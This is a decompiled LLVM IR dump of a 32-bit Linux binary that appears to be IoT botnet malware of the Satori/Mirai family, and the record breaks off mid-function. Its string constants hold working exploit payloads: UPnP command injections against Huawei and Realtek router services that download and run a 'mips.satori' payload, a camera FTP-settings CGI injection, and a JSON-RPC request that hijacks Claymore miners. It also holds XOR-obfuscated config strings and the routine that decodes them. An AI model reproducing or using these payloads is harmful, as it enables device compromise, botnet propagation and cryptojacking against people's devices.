source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%tms = type { i32, i32, i32, i32 }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%linux_dirent64 = type { i32 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_804f5c8.2 = global i32 0
@global_var_804f5e0.3 = local_unnamed_addr global i32* @global_var_804f5c8.2
@global_var_804f664.4 = global i32 0
@global_var_804f67c.5 = local_unnamed_addr global i32 0
@global_var_804f680.6 = local_unnamed_addr global i32 0
@global_var_804d118.7 = constant i32 1953775231
@global_var_804d12e.8 = constant i32 1932670822
@global_var_804d144.9 = constant i32 1969760375
@global_var_804d14c.10 = constant i32 1719085162
@global_var_804d271.11 = constant i32 2137139298
@global_var_804d153.12 = constant i32 1969760375
@global_var_804d162.13 = constant i32 1661413473
@global_var_804d167.14 = constant i32 1681080118
@global_var_804d17b.15 = constant i32 1968137073
@global_var_804d186.16 = constant i32 1684824434
@global_var_804d18f.17 = constant i32 2138204514
@global_var_804d19d.18 = constant i32 1617257838
@global_var_804d1a9.19 = constant i32 1414747976
@global_var_804d1b9.20 = constant i32 1969513329
@global_var_804d1c4.21 = constant i32 1650882160
@global_var_804d1cf.22 = constant i32 1684235877
@global_var_804d1e7.23 = constant i32 1684235877
@global_var_804d209.24 = constant i32 2000041069
@global_var_804d221.25 = constant i32 808283442
@global_var_804d22a.26 = constant i32 1632330347
@global_var_804d233.27 = constant i32 1684420192
@global_var_804d24b.28 = constant i32 1430283854
@global_var_804d256.29 = constant i32 1953657897
@global_var_804d267.30 = constant i32 1969760375
@global_var_804d277.31 = constant i32 1953656873
@global_var_804d288.32 = constant i32 1953658665
@global_var_804d299.33 = constant [51 x i8] c"%|cn=%+7%'tmihwu%d%=)5%7'+j%sbho%c%=njbiXubuheshz%\00"
@global_var_804d2cc.34 = constant [53 x i8] c"%|cn=%+7%'tmihwu%d%=)5%7'+j%sbho%c%=njbiXub`tsfs6sz%\00"
@global_var_804f684.35 = local_unnamed_addr global i32 0
@global_var_804d301.36 = constant i32 1898446895
@global_var_804f5e4.37 = local_unnamed_addr global i32 -1
@global_var_804f6dc.38 = local_unnamed_addr global i32 0
@global_var_804f68c.39 = local_unnamed_addr global i32 0
@global_var_804f698.40 = local_unnamed_addr global i32 0
@global_var_804f690.41 = local_unnamed_addr global i32 0
@global_var_804f694.42 = local_unnamed_addr global i32 0
@global_var_804f5ec.43 = constant [27 x i8] c"AVPNWGUZLYORESJTHQDFCXBIMK\00"
@global_var_804f69c.44 = local_unnamed_addr global i32 0
@global_var_804f6a8.46 = local_unnamed_addr global i32 0
@global_var_804d3d3.47 = constant [26 x i8] c"EthDcrMiner64.exe -epool \00"
@global_var_804d3ed.48 = constant [8 x i8] c" -ewal \00"
@global_var_804d3f3.49 = constant i32 1831665696
@global_var_804d3f5.50 = constant [27 x i8] c"-mode 1 -mport 3333 -mpsw \00"
@global_var_804d410.51 = constant [3 x i8] c"%x\00"
@global_var_804d413.52 = constant [71 x i8] c"{\22id\22:0,\22jsonrpc\22:\222.0\22,\22method\22:\22miner_file\22,\22params\22:[\22reboot.bat\22,\22\00"
@global_var_804d45a.53 = constant [5 x i8] c"\22]}\22\00"
@global_var_804d45f.54 = constant [62 x i8] c"bdoh,*b,%p`bs,ossw=([(6?2)15)6??)??(e(`,*H,(sjw()d%,9,(sjw()a\00"
@global_var_804f6a4.55 = local_unnamed_addr global i32 0
@global_var_804d49d.56 = constant [32 x i8] c"bdoh,*b,%to,(sjw()d%,99,(sjw()a\00"
@global_var_804d4bd.57 = constant [11 x i8] c"to,(sjw()a\00"
@global_var_804d4c8.58 = constant [18 x i8] c"GET login.cgi\0D\0A\0D\0A\00"
@global_var_804d4da.59 = constant [10 x i8] c"loginuser\00"
@global_var_804d4e4.60 = constant i32 1162281019
@global_var_804d4e6.61 = constant [27 x i8] c"GET /set_ftp.cgi?loginuse=\00"
@global_var_804d501.62 = constant [11 x i8] c"&loginpas=\00"
@global_var_804d50c.63 = constant [88 x i8] c"&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28\00"
@global_var_804d564.64 = constant [17 x i8] c"%29 HTTP/1.0\0D\0A\0D\0A\00"
@global_var_804d575.65 = constant [27 x i8] c"GET /ftptest.cgi?loginuse=\00"
@global_var_804d567.66 = constant [14 x i8] c" HTTP/1.0\0D\0A\0D\0A\00"
@global_var_804d590.68 = constant [860 x i8] c"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\0D\0AHost: 127.0.0.1:37215\0D\0AUser-Agent: Hello-World\0D\0AContent-Length: 413\0D\0AConnection: keep-alive\0D\0AAccept: */*\0D\0AAccept-Encoding: gzip, deflate\0D\0AAuthorization: Digest username=\22dslf-config\22, realm=\22HuaweiHomeGateway\22, nonce=\2288645cefb1f9ede0e336e3569d75ee30\22, uri=\22/ctrlt/DeviceUpgrade_1\22, response=\223612f843a42db38f48f59d2a3597e19c\22, algorithm=\22MD5\22, qop=\22auth\22, nc=00000001, cnonce=\22248d1a2560100669\22\0D\0A\0D\0A<?xml version=\221.0\22 ?>\0D\0A    <s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22>\0D\0A    <s:Body><u:Upgrade xmlns:u=\22urn:schemas-upnp-org:service:WANPPPConnection:1\22>\0D\0A    <NewStatusURL>$(/bin/busybox wget -g %d.%d.%d.%d -l /tmp/.f -r /g/h;sh /tmp/.f)</NewStatusURL>\0D\0A<NewDownloadURL></NewDownloadURL>\0D\0A</u:Upgrade>\0D\0A    </s:Body>\0D\0A    </s:Envelope>\0D\0A\0D\0A\00"
@global_var_804d572.69 = constant [3 x i8] c"\0D\0A\00"
@global_var_804d8ec.70 = constant [14 x i8] c"\22error\22: null\00"
@global_var_804d8fa.71 = constant [852 x i8] c"POST /picdesc.xml HTTP/1.1\0D\0AHost: 127.0.0.1:52869\0D\0AContent-Length: 620\0D\0AAccept-Encoding: gzip, deflate\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0AAccept: */*\0D\0AUser-Agent: Hello-World\0D\0AConnection: keep-alive\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;cp $SHELL %s;>%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\0D\0A\0D\0A\00"
@global_var_804dc4e.72 = constant [880 x i8] c"POST /picdesc.xml HTTP/1.1\0D\0AHost: 127.0.0.1:52869\0D\0AContent-Length: 642\0D\0AAccept-Encoding: gzip, deflate\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0AAccept: */*\0D\0AUser-Agent: Hello-World\0D\0AConnection: keep-alive\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;wget http://%d.%d.%d.%d/mips.satori -O -> %s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\0D\0A\0D\0A\00"
@global_var_804dfbe.73 = constant [852 x i8] c"POST /picdesc.xml HTTP/1.1\0D\0AHost: 127.0.0.1:52869\0D\0AContent-Length: 620\0D\0AAccept-Encoding: gzip, deflate\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0AAccept: */*\0D\0AUser-Agent: Hello-World\0D\0AConnection: keep-alive\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;chmod +x %s;./%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\0D\0A\0D\0A\00"
@global_var_804f6ac.74 = local_unnamed_addr global i32 0
@global_var_804f6d4.76 = global i32 0
@global_var_804f6e0.77 = global i32 0
@global_var_804f608.78 = global i32 0
@global_var_804f78c.80 = global i32 0
@global_var_804f790.81 = local_unnamed_addr global i32 0
@global_var_804f794.82 = global i32 0
@global_var_804f7a0.83 = local_unnamed_addr global i32 0
@global_var_804fa94.84 = global i32 0
@global_var_804fabc.85 = local_unnamed_addr global i32 0
@global_var_804faac.86 = local_unnamed_addr global i32 0
@global_var_804fab0.87 = local_unnamed_addr global i32 0
@global_var_804fab4.88 = local_unnamed_addr global i32 0
@global_var_804fad0.89 = local_unnamed_addr global i32 0
@global_var_804fab8.90 = local_unnamed_addr global i32 0
@global_var_804fac4.91 = local_unnamed_addr global i32 0
@global_var_804fac8.92 = local_unnamed_addr global i32 0
@global_var_804fad4.93 = local_unnamed_addr global i32 0
@global_var_804faa8.94 = local_unnamed_addr global i32 0
@global_var_804faa4.96 = local_unnamed_addr global i32 0
@global_var_804facc.97 = local_unnamed_addr global i32 0
@global_var_804f79c.98 = local_unnamed_addr global i32 0
@global_var_804f620.99 = global i32 0
@global_var_804f638.101 = global i32 0
@global_var_804f6b8.102 = local_unnamed_addr global i32 0
@global_var_804f5bc.104 = global i32 -1
@global_var_804c790.105 = constant i32 -294069
@global_var_804f6c8.106 = local_unnamed_addr global i32 0
@global_var_804f6cc.107 = local_unnamed_addr global i32 0
@global_var_804e5ac.108 = constant [10 x i8] c"/dev/null\00"
@global_var_804f6c4.110 = local_unnamed_addr global i32 0
@global_var_804f6bc.111 = local_unnamed_addr global i32 0
@global_var_804f6c0.112 = local_unnamed_addr global i32 0
@global_var_804d208.113 = constant i32 909405440
@global_var_804f650.114 = local_unnamed_addr global i32* @global_var_804d208.113
@global_var_804c978.115 = constant i32 1928542531
@global_var_804c99c.116 = constant i32 1928542531
@global_var_804f6d8.117 = local_unnamed_addr global i32 0
@global_var_804fad8.118 = local_unnamed_addr global i32 0
@global_var_804fadc.119 = local_unnamed_addr global i32 0
@global_var_804f660.1 = local_unnamed_addr global i8 0
@global_var_804f6a0.45 = local_unnamed_addr global i16 0
@global_var_804f6a1.67 = global i8 0
@global_var_804f6b0.75 = external local_unnamed_addr global i8*
@global_var_804f760.79 = global i8 0
@global_var_804fac0.95 = local_unnamed_addr global i8 0
@global_var_804f6b4.100 = local_unnamed_addr global i8 0
@global_var_804f6d0.109 = local_unnamed_addr global i8 0

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8048094() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @function_80480b0(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 30003
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @function_8048110()
  %v0_80480a8 = call i32 @function_804d0d0()
  ret i32 %v0_80480a8
}

define i32 @function_80480b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @function_80480c0() local_unnamed_addr {
dec_label_pc_80480c0:
  %v0_80480c6 = load i8, i8* @global_var_804f660.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %dec_label_pc_80480c0.dec_label_pc_8048102_crit_edge

dec_label_pc_80480c0.dec_label_pc_8048102_crit_edge: ; preds = %dec_label_pc_80480c0
  %v0_8048103.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048102

dec_label_pc_80480db.preheader:                   ; preds = %dec_label_pc_80480c0
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_804f5e0.3 to i32*), align 32
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e44 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e44, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_804f5e0.3 to i32*), align 32
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_804f5e0.3 to i32*), align 32
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_804f660.1, align 32
  br label %dec_label_pc_8048102

dec_label_pc_8048102:                             ; preds = %dec_label_pc_80480c0.dec_label_pc_8048102_crit_edge, %dec_label_pc_80480e6
  %v0_8048103 = phi i32 [ %v0_8048103.pre, %dec_label_pc_80480c0.dec_label_pc_8048102_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048103

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_804f5e0.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_804f660.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048102, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @function_8048110() local_unnamed_addr {
dec_label_pc_8048110:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_804814a, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048145 = call i32 @unknown_0(i32 134538680)
  br label %dec_label_pc_804814a

dec_label_pc_804814a:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_804814a = load i32, i32* inttoptr (i32 134542796 to i32*), align 4
  %v1_804814f = icmp eq i32 %v0_804814a, 0
  br i1 %v1_804814f, label %dec_label_pc_8048165, label %dec_label_pc_8048153

dec_label_pc_8048153:                             ; preds = %dec_label_pc_804814a
  br label %dec_label_pc_8048165

dec_label_pc_8048165:                             ; preds = %dec_label_pc_8048153, %dec_label_pc_804814a
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_804814a, { 1, 0 }
}

define i32 @entry_point(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_8048170 = load i32, i32* @eax, align 4
  store i32 %v0_8048170, i32* %stack_var_-4, align 4
  %v4_8048170 = ptrtoint i32* %stack_var_-4 to i32
  %v0_8048172 = load i32, i32* @edx, align 4
  %v9_8048184 = call i32 @function_804c82c(i32 134515640, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134533377, i32 %v0_8048172, i32 %v4_8048170, i32 %v0_8048170)
  ret i32 %v9_8048184

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_804818a(i8 %arg1) local_unnamed_addr {
dec_label_pc_804818a:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804818b = load i32, i32* @ebx, align 4
  store i32 %v0_804818b, i32* %stack_var_-8, align 4
  %v0_804818c = load i32, i32* @global_var_804f67c.5, align 4
  store i32 %v0_804818c, i32* %ebx.global-to-local, align 4
  %v4_8048192 = zext i8 %arg1 to i32
  %v5_8048192 = load i32, i32* @ecx, align 4
  %v6_8048192 = and i32 %v5_8048192, -256
  %v7_8048192 = or i32 %v6_8048192, %v4_8048192
  store i32 %v7_8048192, i32* @ecx, align 4
  %v1_80481ff5 = icmp eq i32 %v0_804818c, 0
  %v1_80482017 = icmp eq i1 %v1_80481ff5, false
  br i1 %v1_80482017, label %dec_label_pc_8048198, label %dec_label_pc_8048203

dec_label_pc_8048198:                             ; preds = %dec_label_pc_804818a, %dec_label_pc_80481fc
  %v0_80481fc = phi i32 [ %v3_80481fc, %dec_label_pc_80481fc ], [ %v0_804818c, %dec_label_pc_804818a ]
  %v1_8048198 = inttoptr i32 %v0_80481fc to i32*
  %v2_8048198 = load i32, i32* %v1_8048198, align 4
  store i32 %v2_8048198, i32* %edx.global-to-local, align 4
  %tmp23 = icmp slt i32 %v2_8048198, 1
  br i1 %tmp23, label %dec_label_pc_80481fc, label %dec_label_pc_804819e

dec_label_pc_804819e:                             ; preds = %dec_label_pc_8048198
  store i32 %v4_8048192, i32* @eax, align 4
  %v12_80481a1 = icmp eq i32 %v4_8048192, %v2_8048198
  %v1_80481a3 = icmp eq i1 %v12_80481a1, false
  br i1 %v1_80481a3, label %dec_label_pc_80481fc, label %dec_label_pc_80481a5

dec_label_pc_80481a5:                             ; preds = %dec_label_pc_804819e
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_80481a7 = add i32 %v0_80481fc, 10
  %v2_80481a7 = inttoptr i32 %v1_80481a7 to i8*
  %v3_80481a7 = load i8, i8* %v2_80481a7, align 1
  %v4_80481a7 = icmp eq i8 %v3_80481a7, 0
  %v1_80481ab = icmp eq i1 %v4_80481a7, false
  br i1 %v1_80481ab, label %dec_label_pc_80481d0.preheader, label %dec_label_pc_8048207

dec_label_pc_80481d0.preheader:                   ; preds = %dec_label_pc_80481a5
  %v1_80481d035 = add i32 %v0_80481fc, 8
  %v2_80481d036 = inttoptr i32 %v1_80481d035 to i16*
  %v3_80481d037 = load i16, i16* %v2_80481d036, align 2
  %v12_80481d439 = icmp eq i16 %v3_80481d037, 0
  br i1 %v12_80481d439, label %dec_label_pc_80481d8, label %dec_label_pc_80481af

dec_label_pc_80481af:                             ; preds = %dec_label_pc_80481d0.preheader, %dec_label_pc_80481af
  %v1_80481b142 = phi i32 [ %v0_80481d0.pre, %dec_label_pc_80481af ], [ %v0_80481fc, %dec_label_pc_80481d0.preheader ]
  %v0_80481af41 = phi i32 [ %v0_80481d4.pre, %dec_label_pc_80481af ], [ 0, %dec_label_pc_80481d0.preheader ]
  %v2_80481b1 = add i32 %v1_80481b142, 4
  %v3_80481b1 = inttoptr i32 %v2_80481b1 to i32*
  %v4_80481b1 = load i32, i32* %v3_80481b1, align 4
  %v5_80481b1 = add i32 %v4_80481b1, %v0_80481af41
  %v1_80481b4 = inttoptr i32 %v5_80481b1 to i8*
  %v2_80481b4 = load i8, i8* %v1_80481b4, align 1
  %v3_80481b4 = xor i8 %v2_80481b4, -19
  store i8 %v3_80481b4, i8* %v1_80481b4, align 1
  %v0_80481b7 = load i32, i32* %edx.global-to-local, align 4
  %v1_80481b9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80481b9 = add i32 %v1_80481b9, 4
  %v3_80481b9 = inttoptr i32 %v2_80481b9 to i32*
  %v4_80481b9 = load i32, i32* %v3_80481b9, align 4
  %v5_80481b9 = add i32 %v4_80481b9, %v0_80481b7
  %v1_80481bc = inttoptr i32 %v5_80481b9 to i8*
  %v2_80481bc = load i8, i8* %v1_80481bc, align 1
  %v3_80481bc = xor i8 %v2_80481bc, -22
  store i8 %v3_80481bc, i8* %v1_80481bc, align 1
  %v0_80481bf = load i32, i32* %edx.global-to-local, align 4
  %v1_80481c1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80481c1 = add i32 %v1_80481c1, 4
  %v3_80481c1 = inttoptr i32 %v2_80481c1 to i32*
  %v4_80481c1 = load i32, i32* %v3_80481c1, align 4
  %v5_80481c1 = add i32 %v4_80481c1, %v0_80481bf
  %v1_80481c4 = inttoptr i32 %v5_80481c1 to i8*
  %v2_80481c4 = load i8, i8* %v1_80481c4, align 1
  %v3_80481c4 = xor i8 %v2_80481c4, -34
  store i8 %v3_80481c4, i8* %v1_80481c4, align 1
  %v0_80481c7 = load i32, i32* %edx.global-to-local, align 4
  %v1_80481c9 = add i32 %v0_80481c7, 1
  store i32 %v1_80481c9, i32* %edx.global-to-local, align 4
  %v1_80481ca = load i32, i32* %ebx.global-to-local, align 4
  %v2_80481ca = add i32 %v1_80481ca, 4
  %v3_80481ca = inttoptr i32 %v2_80481ca to i32*
  %v4_80481ca = load i32, i32* %v3_80481ca, align 4
  %v5_80481ca = add i32 %v4_80481ca, %v0_80481c7
  %v1_80481cd = inttoptr i32 %v5_80481ca to i8*
  %v2_80481cd = load i8, i8* %v1_80481cd, align 1
  %v3_80481cd = xor i8 %v2_80481cd, -34
  store i8 %v3_80481cd, i8* %v1_80481cd, align 1
  %v0_80481d0.pre = load i32, i32* %ebx.global-to-local, align 4
  %v0_80481d4.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_80481d0 = add i32 %v0_80481d0.pre, 8
  %v2_80481d0 = inttoptr i32 %v1_80481d0 to i16*
  %v3_80481d0 = load i16, i16* %v2_80481d0, align 2
  %v4_80481d0 = zext i16 %v3_80481d0 to i32
  %v5_80481d6 = icmp slt i32 %v0_80481d4.pre, %v4_80481d0
  br i1 %v5_80481d6, label %dec_label_pc_80481af, label %dec_label_pc_80481d8

dec_label_pc_80481d8:                             ; preds = %dec_label_pc_80481af, %dec_label_pc_80481d0.preheader
  %v5_80481e146 = phi i32 [ 0, %dec_label_pc_80481d0.preheader ], [ %v0_80481d4.pre, %dec_label_pc_80481af ]
  %v1_80481b1.lcssa = phi i32 [ %v0_80481fc, %dec_label_pc_80481d0.preheader ], [ %v0_80481d0.pre, %dec_label_pc_80481af ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v1_80481f227 = add i32 %v1_80481b1.lcssa, 8
  %v2_80481f228 = inttoptr i32 %v1_80481f227 to i16*
  %v3_80481f229 = load i16, i16* %v2_80481f228, align 2
  %v4_80481f230 = zext i16 %v3_80481f229 to i32
  store i32 %v4_80481f230, i32* @eax, align 4
  %v12_80481f631 = icmp eq i16 %v3_80481f229, 0
  br i1 %v12_80481f631, label %dec_label_pc_8048203, label %dec_label_pc_80481dc

dec_label_pc_80481dc:                             ; preds = %dec_label_pc_80481d8, %dec_label_pc_80481dc.dec_label_pc_80481dc_crit_edge
  %v5_80481e1 = phi i32 [ %v5_80481e1.pre, %dec_label_pc_80481dc.dec_label_pc_80481dc_crit_edge ], [ %v5_80481e146, %dec_label_pc_80481d8 ]
  %v0_80481dc34 = phi i32 [ %v1_80481ef, %dec_label_pc_80481dc.dec_label_pc_80481dc_crit_edge ], [ 0, %dec_label_pc_80481d8 ]
  %v1_80481de33 = phi i32 [ %v0_80481f2.pre, %dec_label_pc_80481dc.dec_label_pc_80481dc_crit_edge ], [ %v1_80481b1.lcssa, %dec_label_pc_80481d8 ]
  %v2_80481de = add i32 %v1_80481de33, 4
  %v3_80481de = inttoptr i32 %v2_80481de to i32*
  %v4_80481de = load i32, i32* %v3_80481de, align 4
  %v5_80481de = add i32 %v4_80481de, %v0_80481dc34
  %v1_80481e1 = add i32 %v5_80481de, 1
  %v2_80481e1 = inttoptr i32 %v1_80481e1 to i8*
  %v3_80481e1 = load i8, i8* %v2_80481e1, align 1
  %v4_80481e1 = zext i8 %v3_80481e1 to i32
  %v6_80481e1 = and i32 %v5_80481e1, -256
  %v7_80481e1 = or i32 %v6_80481e1, %v4_80481e1
  store i32 %v7_80481e1, i32* %edx.global-to-local, align 4
  %v1_80481e4 = inttoptr i32 %v5_80481de to i8*
  %v2_80481e4 = load i8, i8* %v1_80481e4, align 1
  %v3_80481e4 = zext i8 %v2_80481e4 to i32
  %v4_80481e4 = load i32, i32* @ecx, align 4
  %v5_80481e4 = and i32 %v4_80481e4, -256
  %v6_80481e4 = or i32 %v5_80481e4, %v3_80481e4
  store i32 %v6_80481e4, i32* @ecx, align 4
  store i8 %v3_80481e1, i8* %v1_80481e4, align 1
  %v0_80481e8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80481e8 = add i32 %v0_80481e8, 4
  %v2_80481e8 = inttoptr i32 %v1_80481e8 to i32*
  %v3_80481e8 = load i32, i32* %v2_80481e8, align 4
  %v0_80481eb = load i32, i32* @ecx, align 4
  %v1_80481eb = trunc i32 %v0_80481eb to i8
  %v3_80481eb = load i32, i32* %esi.global-to-local, align 4
  %v4_80481eb = add i32 %v3_80481e8, 1
  %v5_80481eb = add i32 %v4_80481eb, %v3_80481eb
  %v6_80481eb = inttoptr i32 %v5_80481eb to i8*
  store i8 %v1_80481eb, i8* %v6_80481eb, align 1
  %v0_80481ef = load i32, i32* %esi.global-to-local, align 4
  %v1_80481ef = add i32 %v0_80481ef, 2
  %v0_80481f2.pre = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v1_80481ef, i32* %esi.global-to-local, align 4
  %v1_80481f2 = add i32 %v0_80481f2.pre, 8
  %v2_80481f2 = inttoptr i32 %v1_80481f2 to i16*
  %v3_80481f2 = load i16, i16* %v2_80481f2, align 2
  %v4_80481f2 = zext i16 %v3_80481f2 to i32
  store i32 %v4_80481f2, i32* @eax, align 4
  %v5_80481f8 = icmp slt i32 %v1_80481ef, %v4_80481f2
  br i1 %v5_80481f8, label %dec_label_pc_80481dc.dec_label_pc_80481dc_crit_edge, label %dec_label_pc_8048203

dec_label_pc_80481dc.dec_label_pc_80481dc_crit_edge: ; preds = %dec_label_pc_80481dc
  %v5_80481e1.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80481dc

dec_label_pc_80481fc:                             ; preds = %dec_label_pc_804819e, %dec_label_pc_8048198
  %v1_80481fc = add i32 %v0_80481fc, 12
  %v2_80481fc = inttoptr i32 %v1_80481fc to i32*
  %v3_80481fc = load i32, i32* %v2_80481fc, align 4
  store i32 %v3_80481fc, i32* %ebx.global-to-local, align 4
  %v1_80481ff = icmp eq i32 %v3_80481fc, 0
  %v1_8048201 = icmp eq i1 %v1_80481ff, false
  br i1 %v1_8048201, label %dec_label_pc_8048198, label %dec_label_pc_80481ff.dec_label_pc_8048203.loopexit3_crit_edge

dec_label_pc_80481ff.dec_label_pc_8048203.loopexit3_crit_edge: ; preds = %dec_label_pc_80481fc
  br label %dec_label_pc_8048203

dec_label_pc_8048203:                             ; preds = %dec_label_pc_80481d8, %dec_label_pc_80481dc, %dec_label_pc_804818a, %dec_label_pc_80481ff.dec_label_pc_8048203.loopexit3_crit_edge
  %v0_8048203 = phi i32 [ %v3_80481fc, %dec_label_pc_80481ff.dec_label_pc_8048203.loopexit3_crit_edge ], [ %v0_804818c, %dec_label_pc_804818a ], [ %v1_80481b1.lcssa, %dec_label_pc_80481d8 ], [ %v0_80481f2.pre, %dec_label_pc_80481dc ]
  %v1_8048203 = add i32 %v0_8048203, 10
